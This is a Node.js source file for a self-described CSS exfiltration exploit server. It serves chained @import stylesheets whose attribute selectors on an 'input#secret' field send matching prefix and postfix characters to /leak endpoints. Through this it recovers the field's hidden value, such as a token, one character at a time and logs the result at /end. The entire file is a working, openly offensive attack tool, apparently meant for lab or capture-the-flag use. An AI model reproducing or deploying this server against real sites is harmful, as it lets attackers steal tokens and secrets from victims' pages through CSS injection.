/**
 * This Node.js CSS exfil exploit server operates based on the order of HTTP requests
 * made to the `/next` and `/leak` endpoints:
 *
 * 1. When `/start` is called:
 *    - It marks the initial call to the exploit server, initiating the CSS
 *      serving process using the @import rule.
 *
 * 2. If `/next` is called first:
 *    - The `/next` response is queued, and the `ready` counter is incremented.
 *    - The first `/leak` request is captured, further incrementing `ready` (now 2).
 *    - The second `/leak` request is captured, processes the queued response,
 *      and resets `ready` to 0.
 *
 * 3. If `/next` is called second:
 *    - The first `/leak` request is captured, incrementing `ready`.
 *    - The `/next` response is queued, and `ready` is incremented again (now 2),
 *      indicating the next `/leak` request can generate the queued response.
 *    - The second `/leak` request is captured, processes the queued response,
 *      and resets `ready` to 0.
 *
 * 4. If `/next` is called third:
 *    - The first `/leak` request is captured and increments `ready`.
 *    - The second `/leak` request is captured and increments `ready` again (now 2),
 *      indicating a new prefix and postfix.
 *    - The `/next` response is generated immediately.
 *
 * 5. When `/end` is called:
 *    - This indicates that the exfiltration value matches the prefix + postfix values,
 *      stopping the recursion.
 *
 * This sequence ensures that responses are generated and queued based on the order
 * of requests and the `ready` state.
 */


const http = require('http');
const url = require('url');

const HOST = "127.0.0.1";
const PORT = 8088;
const HOSTNAME = `http://${HOST}:${PORT}`;

let prefix = "";
let postfix = "";
let pending = [];
let stop = false;
let ready = 0;
let n = 0;

const requestHandler = (request, response) => {
    
    const req = url.parse(request.url, true);

    if (stop) return response.end();

    switch (req.pathname) {
        case "/start":
            // This route gets called when your payload is executed for the first time
            // and kicks off the css import recursion.
            genResponse(response);
            break;
        case "/leak":
            // This route is called when any of the generated CSS rules match the
            // value of the field you're attempting to exfiltrate.
        
            response.end();
        
            if (req.query.pre && prefix !== req.query.pre) {
                // Set the leaked prefix to be used in the next recursion.
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
                // Set the leaked postfix to be used in the next recursion.
                postfix = req.query.post;
            }
        
            // If both prefix and postfix have been leaked, return the next CSS import.
            // Otherwise, increase the ready counter and wait for the next leak.
            if (ready === 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
            }

            break;
        case "/next":
            // This route serves a new stylesheet if both prefix and postfix
            // leaks are ready. Otherwise, it will queue the response and increase the ready counter.
            if (ready === 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
            }
            break;
        case "/end":
            // This route gets called when the 'is equal to' selector matches the exfil field value.
            stop = true;
            console.log(`[+] END: ${req.query.token}`);
            response.end();
            break;
        default:
            response.end();
    }
};

const genResponse = (response) => {
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    const css = constructCSS();
    response.writeHead(200, { 'Content-Type': 'text/css' });
    response.write(css);
    response.end();
    n++;
};

function constructCSS() {
    console.log(`...pre-payoad: ${prefix}`);
    console.log(`...post-payoad: ${postfix}`);

    // Use all printable ASCII characters in CSS selector list
    const exfilChars = Array.from({ length: 128 - 32 }, (_, i) => String.fromCharCode(i + 32));

    // First line of the stylesheet is a call to import the next stylesheet
    const cache_buster = Math.random();
    const importRule = `@import url(${HOSTNAME}/next?${cache_buster});`;

    // The next section of the stylesheet is a list of 'ends with' selectors for the current postfix
    const postfixSelectors =
        exfilChars.map(char => `input#secret[value$="${cssEscape(char + postfix)}"]{--e${n}:url(${HOSTNAME}/leak?post=${encodeURIComponent(char + postfix)})}`)
        .join('');

    // This line makes the call to /leak with the matched 'ends with' selector
    const postfixBeacon = `div `.repeat(n) + `input#secret{background:var(--e${n}) !important}`;

    // The next section of the stylesheet is a list of 'starts with' selectors for the current prefix
    const prefixSelectors =
        exfilChars.map(char => `input#secret[value^="${cssEscape(prefix + char)}"]{--s${n}:url(${HOSTNAME}/leak?pre=${encodeURIComponent(prefix + char)})}`)
        .join('');

    // This line makes the call to /leak with the matched 'starts with' selector
    const prefixBeacon = `div `.repeat(n) + `input#secret{border-image:var(--s${n}) !important}`;

    // When the value matches prefix + postfix we're done, exfil completed, stop the recursion
    const endSelector = `input#secret[value=${cssEscape(prefix + postfix)}]{list-style:url(${HOSTNAME}/end?token=${encodeURIComponent(prefix + postfix)}&)}`;

    // Build and return stylesheet
    const css = importRule + postfixSelectors + postfixBeacon + prefixSelectors + prefixBeacon + endSelector;
    return css;
}

// Function to escape potentially problematic characters in css selectors
function cssEscape(str) {
    return str.replace(/[-\/\\^$*+?.()|[\]{}'"]/g, '\\$&');
}

const server = http.createServer(requestHandler);

server.listen(PORT, HOST, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log(`[+] Server is running at ${HOSTNAME}`);
});
